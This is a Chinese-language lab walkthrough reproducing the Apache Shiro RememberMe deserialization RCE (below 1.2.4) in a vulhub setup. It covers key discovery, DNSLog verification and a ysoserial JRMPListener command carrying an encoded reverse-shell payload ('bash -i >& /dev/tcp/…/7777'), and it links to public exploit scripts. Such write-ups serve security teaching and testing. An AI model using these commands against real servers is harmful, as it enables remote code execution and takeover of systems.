> 本文由 东塔网络安全学院学员---邵同学 投稿。

# 1 漏洞原理

Apache
Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。Payload产生的过程：命令=>序列化=>AES加密=>base64编码=>RememberMe
Cookie值。

## 2 影响版本

Apache Shiro < 1.2.4

## 3 特征判断

返回包中包含rememberMe=deleteMe字段。

## 4 漏洞复现

### 环境搭建：

安装Apache Shiro

使用vulhub，在docker环境下直接搭建，具体过程不再赘述。

安装maven,用来编译ysoserial.jar

sudo wget
https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz

tar -zxvf apache-maven-3.6.3-bin.tar.gz

  

 **在/etc/profile末尾添加maven环境变量:**

export M2_HOME=/usr/local/maven3

export PATH=$PATH:$JAVA_HOME/bin:$M2_HOME/bin

source /etc/profile

  

 **Java环境：**

使用JDK1.8版本，其他版本可能出现无法编译工具的问题。

  

 **下载编译**

git clone https://github.com/frohoff/ysoserial.git

cd ysoserial（进入对应的安装目录）

mvn package -D skipTests（使用命令进行编译）

  

###  **漏洞验证：**

使用shiro_key.py脚本获取密钥：

python shiro_key.py -u url

![](https://image.3001.net/images/20201203/1606958900_5fc83f341791f70f5ca0f.png!small)

  

![](https://image.3001.net/images/20201203/1606958908_5fc83f3cc2bc12e8551d8.png!small)

  

得到密钥，替换payload生成脚本中的key

  

![](https://image.3001.net/images/20201203/1606958916_5fc83f4498b7bc1b6e1ea.png!small)

  

使用dnslog验证漏洞是否存在。

![](https://image.3001.net/images/20201203/1606958926_5fc83f4e0f91a64953705.png!small)

在登陆页面进行登录，勾选记住密码，抓包，替换cookie为脚本生成的payload，发送数据包:

python shiro_1.2.4.py "command"

![](https://image.3001.net/images/20201203/1606958935_5fc83f57b473557506041.png!small)

![](https://image.3001.net/images/20201203/1606958950_5fc83f668121a733d91b8.png!small)

DNSLog收到结果,证明漏洞存在。

![](https://image.3001.net/images/20201203/1606958960_5fc83f70cd705d0e752fa.png!small)

  

###  **反弹shell：**

执行以下命令在本地监听6666端口，此端口用来和服务器端执行的exp开启的端口建立通信：

java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666
CommonsCollections4 'bash -c
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjI0MS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}'

  

在bash.....,-1}中的代码为实际反弹shell命令，在建立端口号为6666连接后，通过该连接发送给服务器，反弹shell,语句为：

bash -i >& dev/tcp/192.168.10.241(攻击机IP)/7777（shell监听端口） 0>&1

这里提供一个命令转化网址：https://x.hacking8.com/?post=293

![](https://image.3001.net/images/20201203/1606958968_5fc83f78ca52c9709be8b.png!small)

在本地打开监听7777端口的进程，使用payload生成脚本生成连接本地ysoserial监听程序的exp,替换发送。

生成payload命令：python shiro1.2.4_py 监听机ip:端口号

![](https://image.3001.net/images/20201203/1606958977_5fc83f816e7e27cbd7540.png!small)

![](https://image.3001.net/images/20201203/1606958985_5fc83f89780295a108a83.png!small)

反弹shell成功

![](https://image.3001.net/images/20201203/1606958994_5fc83f925e278163b5fc0.png!small)

  

Poc脚本：

Key:

[
_https://github.com/insightglacier/Shiro_exploit_](https://github.com/insightglacier/Shiro_exploit)

  

命令执行：

[
_https://github.com/jas502n/SHIRO-550/blob/master/shiro_rce.py_](https://github.com/jas502n/SHIRO-550/blob/master/shiro_rce.py)

